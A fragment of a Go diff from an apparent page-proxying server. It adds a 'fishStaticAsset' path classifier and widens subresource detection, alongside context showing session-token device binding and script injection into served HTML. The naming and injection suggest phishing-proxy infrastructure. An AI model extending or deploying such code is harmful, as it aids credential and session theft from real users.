@@ -55,12 +55,38 @@ func bindPanelDevice(sessionToken, fp, proof string) error {
 	return nil
 }
 
-func browserSubresource(r *http.Request) bool {
-	switch strings.ToLower(r.Header.Get("Sec-Fetch-Dest")) {
-	case "image", "style", "font", "script":
+func fishStaticAsset(path string) bool {
+	p := strings.ToLower(path)
+	if i := strings.Index(p, "?"); i >= 0 {
+		p = p[:i]
+	}
+	if strings.HasPrefix(p, "/api/") {
+		return false
+	}
+	switch {
+	case strings.HasPrefix(p, "/assets/"),
+		strings.HasPrefix(p, "/i18n/"),
+		strings.HasPrefix(p, "/flags/"),
+		strings.HasPrefix(p, "/extra-cdn-"),
+		p == "/manifest.json",
+		p == "/__manifest",
+		strings.HasSuffix(p, ".webmanifest"):
 		return true
 	}
+	for _, ext := range []string{".js", ".css", ".map", ".json", ".data", ".woff", ".woff2", ".svg", ".png", ".webp", ".ico", ".gif", ".jpg", ".jpeg", ".wasm"} {
+		if strings.HasSuffix(p, ext) {
+			return true
+		}
+	}
 	return false
+}
+
+func browserSubresource(r *http.Request) bool {
+	switch strings.ToLower(r.Header.Get("Sec-Fetch-Dest")) {
+	case "image", "style", "font", "script", "audio", "video", "worker", "manifest":
+		return true
+	}
+	return fishStaticAsset(r.URL.Path)
 }
 
 func isDocumentNavigation(r *http.Request) bool {
@@ -229,7 +255,6 @@ func deviceBindHandler(w http.ResponseWriter, r *http.Request) {
 	log.Printf("[DEVICE] proof stored")
 	fmt.Fprintf(w, `{"status":"ok"}`)
 }
-
 
 func serveAccessDeniedHTML(w http.ResponseWriter, r *http.Request) {
 	writeLightCard(w, http.StatusForbidden, lightCard{
@@ -502,7 +527,6 @@ function tmPatchRequests(fp, proof) {
 }
 `
 }
-
 
 func injectDeviceHTML(body []byte) []byte {
 	script := []byte(devicePageScript())
